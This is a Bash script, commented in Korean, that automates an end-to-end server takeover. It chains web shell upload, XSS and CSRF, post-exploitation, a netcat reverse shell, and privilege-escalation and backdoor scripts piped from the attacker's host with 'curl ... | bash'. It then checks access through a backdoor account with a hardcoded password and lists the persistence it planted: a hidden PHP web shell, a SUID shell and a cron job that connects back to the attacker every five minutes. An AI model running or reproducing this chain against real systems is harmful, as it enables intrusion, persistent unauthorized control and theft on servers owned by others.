#!/bin/bash
#
# 전체 공격 체인 자동화 스크립트
# 초기 침투부터 서버 완전 장악까지 전 과정 자동화
#
# 사용법: ./full_attack_chain.sh <TARGET_IP> <ATTACKER_IP>
# 예: ./full_attack_chain.sh 15.164.95.252 13.158.67.78
#

set -e  # 에러 발생 시 중단

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "사용법: ./full_attack_chain.sh <TARGET_IP> <ATTACKER_IP>"
    echo "예: ./full_attack_chain.sh 15.164.95.252 13.158.67.78"
    exit 1
fi

TARGET_IP="$1"
ATTACKER_IP="$2"
ATTACKER_PORT="5000"
REVERSE_SHELL_PORT="4444"

# 색상 코드
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_banner() {
    echo ""
    echo "============================================================"
    echo "$1"
    echo "============================================================"
}

print_step() {
    echo ""
    echo -e "${BLUE}[*] $1${NC}"
}

print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_error() {
    echo -e "${RED}[!] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

# 시작
clear
print_banner "전체 공격 체인 자동화"
echo "타겟 IP:      $TARGET_IP"
echo "공격자 IP:    $ATTACKER_IP"
echo "Flask 서버:   $ATTACKER_IP:$ATTACKER_PORT"
echo "Reverse Shell: $REVERSE_SHELL_PORT"
print_banner ""

read -p "계속하시겠습니까? (y/n): " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo "취소됨"
    exit 0
fi

# 로그 파일
LOG_FILE="logs/attack_$(date +%Y%m%d_%H%M%S).log"
mkdir -p logs
exec > >(tee -a "$LOG_FILE")
exec 2>&1

print_step "로그 파일: $LOG_FILE"

# ============================================================
# 단계 0: 사전 확인
# ============================================================

print_banner "단계 0: 사전 확인"

print_step "필수 파일 확인..."
REQUIRED_FILES=(
    "auto.py"
    "post_exploit.py"
    "privilege_escalation.sh"
    "backdoor_install.sh"
    "run_attack.sh"
)

for file in "${REQUIRED_FILES[@]}"; do
    if [ ! -f "$file" ]; then
        print_error "$file 파일이 없습니다!"
        exit 1
    fi
    print_success "$file 존재"
done

print_step "타겟 서버 연결 확인..."
if curl -s --connect-timeout 5 "http://$TARGET_IP" > /dev/null; then
    print_success "타겟 서버 응답 확인"
else
    print_error "타겟 서버에 연결할 수 없습니다!"
    exit 1
fi

print_step "공격자 서버 확인..."
if curl -s --connect-timeout 5 "http://$ATTACKER_IP:$ATTACKER_PORT" > /dev/null; then
    print_success "공격자 Flask 서버 실행 중"
else
    print_warning "공격자 Flask 서버가 실행되지 않았습니다."
    print_step "다른 터미널에서 다음 명령을 실행하세요:"
    echo "    ssh -i ~/.ssh/id_rsa ubuntu@$ATTACKER_IP"
    echo "    python3 attacker_server.py"
    read -p "준비되면 Enter를 누르세요..."
fi

# ============================================================
# 단계 1: 초기 침투 (auto.py)
# ============================================================

print_banner "단계 1: 초기 침투 (웹쉘 업로드 + XSS + CSRF)"

print_step "run_attack.sh 실행 중..."
bash run_attack.sh "$TARGET_IP" "$ATTACKER_IP"

if [ $? -eq 0 ]; then
    print_success "초기 침투 성공!"
else
    print_error "초기 침투 실패!"
    exit 1
fi

sleep 3

# ============================================================
# 단계 2: 후속 공격 (Post-Exploitation)
# ============================================================

print_banner "단계 2: 후속 공격 (시스템 정보 수집)"

print_step "post_exploit.py 실행 중..."
python3 post_exploit.py "$TARGET_IP" "$ATTACKER_IP" "$REVERSE_SHELL_PORT" <<EOF
2
EOF

if [ $? -eq 0 ]; then
    print_success "시스템 정보 수집 완료!"
else
    print_warning "일부 정보 수집 실패 - 계속 진행"
fi

sleep 2

# ============================================================
# 단계 3: Reverse Shell 획득
# ============================================================

print_banner "단계 3: Reverse Shell 획득"

print_warning "이 단계는 수동 개입이 필요합니다."
echo ""
echo "다음 단계를 따라하세요:"
echo ""
echo "1. 새 터미널을 열고 Netcat 리스너 시작:"
echo "   ${BLUE}nc -lvnp $REVERSE_SHELL_PORT${NC}"
echo ""
echo "2. 다른 터미널에서 post_exploit.py 다시 실행:"
echo "   ${BLUE}python3 post_exploit.py $TARGET_IP $ATTACKER_IP $REVERSE_SHELL_PORT${NC}"
echo "   옵션 1 선택 (Reverse Shell 획득)"
echo ""
echo "3. Reverse Shell 연결되면:"
echo "   ${BLUE}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'${NC}"
echo "   ${BLUE}export TERM=xterm${NC}"
echo ""

read -p "Reverse Shell을 획득했습니까? (y/n): " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    print_warning "Reverse Shell 없이 계속할 수 없습니다."
    print_step "다음 단계는 Reverse Shell 내에서 실행하세요:"
    print_step "1. 권한 상승 스크립트 다운로드 및 실행"
    echo "   curl http://$ATTACKER_IP:$ATTACKER_PORT/scripts/privilege_escalation.sh | bash"
    print_step "2. root 권한 획득 후 백도어 설치"
    echo "   curl http://$ATTACKER_IP:$ATTACKER_PORT/scripts/backdoor_install.sh | sudo bash -s $ATTACKER_IP"
    exit 0
fi

# ============================================================
# 단계 4: 권한 상승 준비
# ============================================================

print_banner "단계 4: 권한 상승 스크립트 배포"

print_step "공격자 서버에 스크립트 업로드..."

# 스크립트들을 공격자 서버에 업로드
ssh -i ~/.ssh/id_rsa ubuntu@"$ATTACKER_IP" "mkdir -p ~/scripts"

scp -i ~/.ssh/id_rsa privilege_escalation.sh ubuntu@"$ATTACKER_IP":~/scripts/
scp -i ~/.ssh/id_rsa backdoor_install.sh ubuntu@"$ATTACKER_IP":~/scripts/

if [ $? -eq 0 ]; then
    print_success "스크립트 업로드 완료"
else
    print_error "스크립트 업로드 실패"
    exit 1
fi

# Flask 서버에서 스크립트 제공하도록 설정
ssh -i ~/.ssh/id_rsa ubuntu@"$ATTACKER_IP" << 'EOF'
cd ~
# attacker_server.py에 /scripts 라우트가 없으면 추가
if ! grep -q "/scripts" attacker_server.py; then
    echo ""
    echo "Flask 서버에 /scripts 라우트를 수동으로 추가하세요"
fi
EOF

print_step "Reverse Shell에서 다음 명령을 실행하세요:"
echo ""
echo "${BLUE}# 1. 권한 상승 스크립트 다운로드 및 실행${NC}"
echo "cd /tmp"
echo "wget http://$ATTACKER_IP:$ATTACKER_PORT/scripts/privilege_escalation.sh"
echo "chmod +x privilege_escalation.sh"
echo "bash privilege_escalation.sh"
echo ""
echo "${BLUE}# 2. 권한 상승 성공 후 (root 권한 획득)${NC}"
echo "wget http://$ATTACKER_IP:$ATTACKER_PORT/scripts/backdoor_install.sh"
echo "chmod +x backdoor_install.sh"
echo "bash backdoor_install.sh $ATTACKER_IP"
echo ""

read -p "권한 상승 및 백도어 설치를 완료했습니까? (y/n): " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    print_warning "수동으로 완료하세요."
    exit 0
fi

# ============================================================
# 단계 5: 서버 접속 확인
# ============================================================

print_banner "단계 5: 서버 접속 확인"

print_step "SSH 접속 테스트 중..."

# 백도어 사용자로 접속 시도
echo ""
print_step "백도어 사용자로 접속 시도..."
echo "사용자: sysadmin"
echo "비밀번호: P@ssw0rd123!"
echo ""

ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 sysadmin@"$TARGET_IP" "whoami && echo '[+] SSH 접속 성공!'" 2>/dev/null

if [ $? -eq 0 ]; then
    print_success "백도어 사용자로 SSH 접속 성공!"
else
    print_warning "백도어 사용자 접속 실패 - root 키로 시도..."

    # root로 접속 시도
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@"$TARGET_IP" "whoami && echo '[+] Root SSH 접속 성공!'" 2>/dev/null

    if [ $? -eq 0 ]; then
        print_success "Root SSH 접속 성공!"
    else
        print_warning "SSH 접속 실패 - 수동으로 확인하세요"
    fi
fi

# ============================================================
# 완료
# ============================================================

print_banner "공격 체인 완료!"

echo ""
echo "공격 성공 확인:"
echo ""
echo "1. SSH 접속:"
echo "   ${GREEN}ssh sysadmin@$TARGET_IP${NC}  (비밀번호: P@ssw0rd123!)"
echo "   또는"
echo "   ${GREEN}ssh root@$TARGET_IP${NC}"
echo ""
echo "2. 웹 백도어:"
echo "   ${GREEN}http://$TARGET_IP/.system.php?c=id${NC}"
echo ""
echo "3. SUID 백도어:"
echo "   ${GREEN}/usr/local/bin/update-checker --shell${NC}"
echo ""
echo "4. Cron 백도어:"
echo "   매 5분마다 $ATTACKER_IP:$REVERSE_SHELL_PORT로 연결"
echo "   ${GREEN}nc -lvnp $REVERSE_SHELL_PORT${NC} (리스너)"
echo ""
echo "5. 리포트:"
echo "   reports/security_report_*.html"
echo ""
echo "로그: $LOG_FILE"
echo ""

print_banner "공격 완료 - 서버 완전 장악"
